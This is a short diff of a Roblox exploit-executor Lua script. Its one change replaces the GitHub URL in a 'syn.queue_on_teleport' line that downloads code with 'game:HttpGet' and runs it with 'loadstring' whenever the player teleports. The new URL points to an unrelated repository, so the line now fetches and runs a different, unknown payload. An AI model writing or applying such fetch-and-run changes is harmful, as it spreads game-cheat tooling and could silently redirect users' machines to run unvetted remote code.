@@ -275,7 +275,7 @@ end))
 
 Player.OnTeleport:Connect(function(State)
     if State == Enum.TeleportState.Started then
-        syn.queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/ObscureScapter/Roblox/main/VTAF"))()]])
+        syn.queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/Ultimate-killer/fixer/main/fixing"))()]])
     end
 end)
 
